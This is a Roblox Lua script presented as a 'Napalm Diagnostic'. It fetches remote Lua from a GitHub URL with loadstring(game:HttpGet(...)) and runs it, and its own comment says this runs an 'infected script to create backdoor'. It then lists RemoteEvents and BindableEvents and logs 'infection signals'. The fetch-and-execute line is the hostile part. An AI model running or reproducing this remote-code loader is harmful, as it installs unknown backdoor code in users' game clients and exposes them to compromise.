local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Print to console
local function log(message)
    print("[Napalm Diagnostic] " .. message)
end

-- Run infected script to create backdoor
log("Running infected script...")
loadstring(game:HttpGet('https://raw.githubusercontent.com/idkmango67/test-repo/main/test.lua'))()

-- Wait for initialization
wait(5)

-- Check BindableEvents on LocalPlayer
log("Checking BindableEvents on LocalPlayer...")
for _, v in pairs(LocalPlayer:GetChildren()) do
    if v:IsA("BindableEvent") then
        log("BindableEvent found: " .. v.Name)
    end
end

-- Check RemoteEvents in ReplicatedStorage
log("Checking RemoteEvents in ReplicatedStorage...")
for _, v in pairs(ReplicatedStorage:GetChildren()) do
    if v:IsA("RemoteEvent") then
        log("RemoteEvent found: " .. v.Name)
    end
end

-- Listen for infection signals
log("Listening for infection signals...")
for _, remote in pairs(ReplicatedStorage:GetChildren()) do
    if remote:IsA("RemoteEvent") then
        remote.OnClientEvent:Connect(function(data)
            if type(data) == "table" then
                log("Infection signal received: " .. tostring(data))
                for key, value in pairs(data) do
                    log("Key: " .. tostring(key) .. ", Value: " .. tostring(value))
                end
            else
                log("Non-table signal received: " .. tostring(data))
            end
        end)
    end
end

log("Diagnostic complete. Check F9 console for results.")
